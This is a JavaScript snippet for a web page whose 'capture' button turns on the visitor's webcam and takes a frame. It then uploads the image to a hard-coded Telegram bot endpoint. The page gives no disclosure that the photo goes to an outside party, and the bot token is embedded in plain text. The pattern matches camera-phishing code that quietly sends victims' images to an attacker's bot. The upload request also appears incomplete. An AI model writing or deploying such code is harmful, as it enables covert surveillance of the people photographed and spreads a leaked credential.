const captureBtn = document.getElementById('capture-btn');
const photoCanvas = document.getElementById('photo-canvas');
const TELEGRAM_BOT_API_ENDPOINT = 'https://api.telegram.org/bot5727820511:AAH0LrTp629GSK9MqR5SVDev5IKRqcGsb-s/sendPhoto';

captureBtn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvasContext = photoCanvas.getContext('2d');
        photoCanvas.width = video.videoWidth;
        photoCanvas.height = video.videoHeight;
        canvasContext.drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
        const photoDataUrl = photoCanvas.toDataURL('image/jpeg');
        await sendPhotoToTelegramBot(photoDataUrl);
    } catch (error) {
        console.error(error);
        alert('Failed to capture photo. Please make sure your camera is enabled and try again.');
    }
});

async function sendPhotoToTelegramBot(photoDataUrl) {
    const formData = new FormData();
    const photoBlob = await fetch(photoDataUrl).then(res => res.blob());
    formData.append('photo', photoBlob, 'photo.jpg');
    const response = await fetch(TELEGRAM_BOT_API_ENDPOINT, {
        method: 'POST',
        body: formData
    });
    console.log(response);
}
